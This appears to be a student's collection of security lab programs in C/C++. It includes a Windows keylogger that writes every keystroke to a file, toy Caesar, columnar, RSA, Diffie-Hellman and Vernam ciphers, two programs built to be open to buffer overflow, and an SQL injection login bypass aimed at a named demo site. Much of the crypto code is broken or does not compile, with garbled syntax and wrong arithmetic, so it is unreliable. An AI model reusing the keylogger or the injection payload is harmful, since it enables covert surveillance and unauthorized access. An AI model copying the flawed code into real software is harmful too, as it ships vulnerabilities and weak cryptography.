
// Keylogger

#include <iostream>
#include <windows.h>
#include <fstream>
using namespace std;

int main()
{
  ofstream MyFile;
  MyFile.open("log_data.txt");
  while (true)
  {
	for (char i = 0; i <= 190; i++){
	  if (GetAsyncKeyState(i) == -32767){
		MyFile << i << endl;
	  }
	}
  }
  system("pause");
  MyFile.close();
  return 0;
}




// Ceaser cipher 


#include<stdio.h>
#include<conio.h>
#include<string.h>

int main(){
  
  int key; int i; char ch;
  char text[100];
  int choice;
  
  printf("Enter your choice: ");
  scanf("%d", &choice);
  
  switch(choice){
	case 1:
	  printf("Enter the text: ");
	  scanf("%s", &text);
	  
	  printf("Enter the key: ");
	  scanf("%d",&key);
	  
	  for(i = 0; i<text[i]; ++i){
		ch = text[i];
		if(ch>='A' && ch<='Z'){
		  ch = ch + key;
		  if(ch > 'Z'){
			ch += ch - 'Z' + 'A' - 1;
		  }
		  text[i] = ch;
		}
		else if(ch >= 'a' && ch <= 'z'){
		  ch = ch + key;
		  if(ch > 'z'){
			ch = ch - 'z' + 'a' - 1;
		  }
		  text[i] = ch;
		}
	  }
	  
	  printf("Encrypted Message: %s", text);
	  break;
	
	case 2:
	  
	  printf("Enter the text: ");
	  scanf("%s", &text);
	  printf("Enter the key: ");
	  scanf("%d",&key);
	  
	  for(i = 0; i<text[i]; ++i){
		ch = text[i];
		if(ch>='A' && ch<='Z'){
		  ch = ch - key;
		  if(ch > 'Z'){
			ch += ch + 'Z' - 'A' + 1;
		  }
		  text[i] = ch;
		}
		else if(ch >= 'a' && ch <= 'z'){
		  ch = ch - key;
		  if(ch > 'z'){
			ch = ch + 'z' - 'a' + 1;
		  }
		  text[i] = ch;
		}
	  }
	  printf("Decrypted Message: %s", text);
  }
  return 0;
}





// Simple columnar


#include <bits/stdc++.h>
using namespace std;

string encrypt(string key, char mat[][3]) {
  int rows = sizeof(mat) / sizeof(mat[0]);
  int cols = sizeof(mat[0]) / sizeof(mat[0][0]);
  string result = "";
  for(int i=0; i < cols; i++) {
	int selCol = key[i]-'0'-1;
	for(int j = 0; j < 4; j++) {
	  if(mat[j][selCol]==0) continue;
	  result+=mat[j][selCol];
	}
  }
  return result;
}

int main()
{
  string message;
  string key;
  cout<<"Enter the Message: ";
  cin >> message;
  // string message = "HELLOWORLD";
  // string key = "231";
  cout<<"Enter the key: ";
  cin >> key;
  // char mat[ceil(message.length()/3)][key.length()]; // mat[3][3]
  char mat[4][3];
  cout<<"Message: "<<message<<endl;
  cout<<"Key: "<<key<<endl;
  int i=0, j=0, k=0;
  while(k < message.length()) {
	mat[i][j] = message[k];
	k++;
	j++;
	if(j==3) {
	  j=0;
	  i++;
	}
  }cout<<"Matrix: \n";
  for(int i=0; i < 4; i++) {
	for(int j=0; j < 3; j++) {
	  cout<<mat[i][j]<<'\t';
	}
	cout<<endl;
  }
  cout<<"Cipher: ";
  string cipher = encrypt(key, mat);
  cout<<cipher;
  return 0;
}




// RSA 



#include <stdio.h>
#include <iostream>
#include <math.h>
using namespace std;

int main(){
  int p; int q; int pt; int d = 0;
  cout << "Enter the secret key to encrypt : ";
  cin >> pt;
  cout << "Enter any prime number P : ";
  in >> p;
  cout << "Enter any prime number Q : ";
  cin >> q;
  int e = 0;
  int n = p*q;
  for(int i=1;i<n;i++){
	if((p-1)%i != 0 && (q-1)%i!=0){
	  e = i;
	  break;
	}
  }
  for(int j=1;j<1000;j++){
	d = (j*e)%((p-1)*(q-1));
	if(d == 1){
	  d=j;
	  break;
	}
  }
  long int ct = pow(pt,e);
  ct = ct % n;
  cout << endl << “Encrypting..”<< "D : " << d << endl << "CT : " << ct;
  cout << endl << “CT sent to receiver.” << endl;
  int pt2 = ct^d%n;
  cout << endl << "N : " << n << endl << "E : " << e << endl << "PT : "<< pt2 << endl;
  return 0;
}




// DH deffie hellman


#include<iostream>
#include<math.h>
using namespace std;

int main(){
  long int n, g, a, b, A, B, A2, B2, k1, k2, K1, K2;
  cout << endl << "Enter the key for A: ";
  cin >> n;
  cout << "Enter the key for B: ";
  cin >> g;
  cout << endl << "Enter the random number for A: ";
  cin >> a;
  cout <<"Enter the random number for B: ";
  cin >> b;
  A = pow(g,a);
  A2 = A % n;
  cout << endl << "## User A sended key 'A' to User B" << endl;
  B = pow(g,b);
  B2 = B % n;
  cout << "## User B sended key 'B' to user A" << endl;
  k1=pow(B2, a);
  K1 = k1%n;
  k2=pow(A2, b);
  K2 = k2%n;
  cout << endl << "Secret computed key for A is: "<< K1 << endl;
  cout << "Secret computed key for B is: "<< K2 << endl << endl ;
  return 0;
}




// Vernam cipher


#include <stdio.h>
#include <iostream>
#include <string>
using namespace std;

int main(){
  string text;
  char txt[20];
  string alphabets = "abcdefghijklmnopqrstuvwxyz";
  string random = "";
  int result2[text.length()] ;
  string out = ""; string out2 = "";
  int tmp = 0; int tmp2 =0;
  char input;
  cout << "Enter the text : ";
  cin >> text;
  //cin.getline(txt, 20);
  cout << "Enter Encryt/Decrypt (E/D)? : ";
  cin >> input;
  if(input=='E'){
	for(int i=0;i<text.length();i++){
	  random += alphabets[rand()%text.length()+1];
	  tmp = alphabets.find(text[i])+alphabets.find(random[i]);
	  if(tmp>25){
		tmp = tmp-26;
	  }
	  out += alphabets[tmp];
	}
	cout << endl << "random : " << random << endl << "cipher : " << out << endl << endl;
  }else if(input=='D'){
	for(int i=0;i<text.length();i++){
	  tmp = alphabets.find(text[i])+alphabets.find(random[i]);
	  random += alphabets[rand()%text.length()+1];
	  tmp2 = alphabets.find(text[i])-alphabets.find(random[i]);
	  if(tmp2<0){
		out2 += alphabets[alphabets.length() + tmp2];
	  }else{
		out2 += alphabets[tmp2];
	  }
	}
	cout << endl << "plain text : " << out2 << endl << endl;
  }
  return 0;
}




// Buffer overflow


#include <stdio.h>

int main(){
  char buffer[10];
  printf("Enter some text:\n");
  scanf("%s", buffer);
  printf("You DATA : '%s' \n", buffer);
  return 0;
}




// Virus preventer


#include <iostream>
#include <string.h>

// A Buffer overflow prone program.

int main (void){
  char buff[5]; // string of length 5 characters
  int pass = 0; // whether to pass user or not
  printf("\n Enter the password ")
  gets (buff);
  if (strmp (buff, "1234")) // compare password
  {
	printf("\n Wrong Password \n ") 5
	exit(1);
  }else{
	printf("\n Correct Password \n");
	pass 1; // go ahead
  }
  if (pass) // Now Give admin rights to user
	printf("\n Admin privileges given to the user \n");
  return 0;
}




# SQL injection


website :- https://demo.testfire.net/login.jsp
inject  :- ' or '1'='1  // In both the field or in password field with username admin 

